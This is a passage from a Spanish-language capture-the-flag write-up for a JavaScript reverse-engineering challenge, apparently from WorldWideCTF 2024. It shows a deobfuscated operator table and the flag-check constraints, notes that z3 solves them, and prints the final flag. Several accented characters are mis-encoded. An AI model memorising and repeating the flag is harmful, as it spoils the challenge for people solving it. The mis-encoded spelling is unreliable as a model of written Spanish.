    Iv1du7HLwfTBhC33: function (x, y) { return `(${y[x.pop()]} ^ ${y[x.pop()]})` },
    FVGaT0YAtvEnrh1L: function (x, y) { return `(${y[x.pop()]} | ${y[x.pop()]})` },
    mDA2bNR6EFYLd7Zp: function (x, y) { return `(${y[x.pop()]} && ${y[x.pop()]})` },
    tVd8iQXoWejgiKNZ: function (x, y) { return `(${y[x.pop()]} || ${y[x.pop()]})` }
}
```
El programa se ver√° as√≠ despu√©s de sustituir el valor y reformatear.

```js
((4991038 === (194 * ((198 + (117 * (81 ^ (flag[(36 % flag.length)] +
    flag[(37 % flag.length)])))) ^ ((117 + (81 * (
    flag[(38 % flag.length)] ^ flag[(37 %
        flag.length)]))) ^ 123)))) && ((342408 === (88 * ((80 + (
    17 * (25 ^ (flag[(35 % flag.length)] +
        flag[(36 % flag.length)])))) ^ ((17 + (
    25 * (flag[(37 % flag.length)] ^ flag[
        (36 % flag.length)]))) ^ 16)))) && ((59685 === (1 * ((
    230 + (239 * (155 ^ (flag[(34 % flag
        .length)] + flag[(35 %
        flag.length)])))) ^ ((239 + (155 * (
    flag[(36 % flag.length)] ^
    flag[(35 % flag.length)]))) ^ 193)))) && ((452012 ===
    (44 * ((74 + (83 * (26 ^ (flag[(33 % flag
        .length)] + flag[(34 %
            flag.length)])))) ^ ((83 + (26 * (
        flag[(35 % flag.length)] ^
        flag[(34 % flag.length)]))) ^ 171)))) && ...
```
Conect√°ndolo al z3 obtendr√° la bandera.


```
wwf{m45h1r0_w41fu_>_<_50_cu73~~_4hw4_}
```

![1](/assets/posts/WorldWideCTF2024/2.png)
